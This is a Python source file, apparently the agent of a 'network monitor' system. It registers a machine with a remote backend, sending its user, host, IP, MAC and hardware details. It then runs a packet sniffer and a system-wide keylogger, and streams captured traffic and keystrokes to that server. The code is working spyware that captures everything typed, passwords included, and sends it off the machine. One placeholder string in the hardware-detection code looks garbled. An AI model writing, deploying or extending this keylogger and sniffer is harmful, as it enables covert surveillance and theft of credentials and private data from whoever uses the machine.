import atexit
import os
import socket
import requests
import socketio
import platform
import subprocess
import re
from threading import Thread
import keyboard
from scapy.sendrecv import sniff
from utils import BACKEND_URL, get_ip, get_mac
from recorder import handle_key_press, handle_key_release, send_batched_keystrokes
from sniffer import handle_sniffed_packets, send_batched_packets


def on_exit(sio: socketio.Client):
    print("Disconnecting from server...")
    try:
        sio.disconnect()
        print("Successfully disconnected socket from server")
    except Exception as e:
        print(f"Failed disconnecting socket from server: {e}")


def get_pc_manufacturer():
    system_os, manufacturer = platform.system(), None
    if system_os == "Windows":
        try:
            output = subprocess.check_output(
                ["wmic", "csproduct", "get", "vendor", "/FORMAT:CSV"],
                text=True,
                stderr=subprocess.DEVNULL,
            ).strip()
            lines = output.splitlines()
            if len(lines) > 1 and "," in lines[1]:
                vendor_part = lines[1].split(",", 1)[1].strip()
                if vendor_part:
                    manufacturer = vendor_part
        except (subprocess.CalledProcessError, FileNotFoundError, IndexError):
            pass
    elif system_os == "Linux":
        paths_to_check = [
            "/sys/class/dmi/id/sys_vendor",
            "/sys/class/dmi/id/board_vendor",
            "/sys/class/dmi/id/chassis_vendor",
        ]
        for path in paths_to_check:
            try:
                with open(path, "r") as f:
                    content = f.read().strip()
                    if content:
                        manufacturer = content
                        break
            except (FileNotFoundError, IOError):
                continue
    elif system_os == "Darwin":
        try:
            output = subprocess.check_output(
                ["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"],
                text=True,
                stderr=subprocess.DEVNULL,
            ).strip()
            match = re.search(
                r'"manufacturer"\s*=\s*<"([^"]+)">', output, re.IGNORECASE
            )
            if match:
                extracted_manufacturer = match.group(1).strip()
                if extracted_manufacturer:
                    manufacturer = extracted_manufacturer
        except (subprocess.CalledProcessError, FileNotFoundError):
            pass
        if not manufacturer:
            manufacturer = "Apple Inc."
    if manufacturer:
        manufacturer = manufacturer.strip()
        known_empty_placeholders = [
            "to be filled by o.e.m.",
            "o.e.m.",
            "not Hustler, not applicable",
            "none",
            "undefined",
            "default string",
            "not specified",
        ]
        if not manufacturer or manufacturer.lower() in known_empty_placeholders:
            manufacturer = None
    return manufacturer if manufacturer else "N/A"


def get_pc_model():
    system = platform.system()
    if system == "Windows":
        try:
            result = subprocess.run(
                ["wmic", "csproduct", "get", "name"],
                capture_output=True,
                text=True,
                check=True,
            )
            for line in result.stdout.splitlines():
                if "Name" not in line and line.strip():
                    return line.strip()
        except Exception:
            pass
    elif system == "Linux":
        try:
            result = subprocess.run(
                ["sudo", "dmidecode", "-s", "system-product-name"],
                capture_output=True,
                text=True,
                check=True,
            )
            return result.stdout.strip()
        except FileNotFoundError:
            try:
                with open("/sys/class/dmi/id/product_name", "r") as f:
                    return f.read().strip()
            except Exception:
                pass
        except Exception:
            pass
    elif system == "Darwin":
        try:
            result = subprocess.run(
                ["system_profiler", "SPHardwareDataType"],
                capture_output=True,
                text=True,
                check=True,
            )
            for line in result.stdout.splitlines():
                if "Model Identifier:" in line:
                    return line.split(":")[1].strip()
        except Exception:
            pass
    return "Unknown"


if __name__ == "__main__":
    print("Initializing Socket Server")
    sio = socketio.Client()
    try:
        requests.get(f"{BACKEND_URL}/socket.io")
    except Exception:
        pass
    try:
        sio.connect(
            BACKEND_URL,
            socketio_path="/api/socket.io",
            transports=["websocket"],
            retry=True,
        )
        print("Connected to Socket.IO server")
    except Exception as e:
        print(f"Failed to connect to Socket.IO server: {e}")
        exit(1)
    atexit.register(on_exit, sio)
    mac = get_mac()
    node = {
        "id": mac,
        "user": os.getlogin(),
        "name": platform.node(),
        "type": "workstation",
        "hostname": socket.gethostname(),
        "ip": get_ip(),
        "mac": mac,
        "os": platform.system() + " " + platform.release(),
        "manufacturer": get_pc_manufacturer(),
        "model": get_pc_model(),
    }
    sio.emit("join", ["Nodes", node])
    print("Starting Network Monitor...")
    packets_thread = Thread(target=send_batched_packets, args=(sio,), daemon=True)
    sniffer_thread = Thread(
        target=lambda: sniff(prn=handle_sniffed_packets), daemon=True
    )
    logger_thread = Thread(
        target=send_batched_keystrokes, args=(BACKEND_URL,), daemon=True
    )
    print("Starting Sniffer Thread")
    packets_thread.start()
    sniffer_thread.start()
    print("Starting Key Logger Thread")
    logger_thread.start()
    print("Listening to keylogs...")
    keyboard.hook(handle_key_press)
    keyboard.wait(None)
    keyboard.unhook_all()
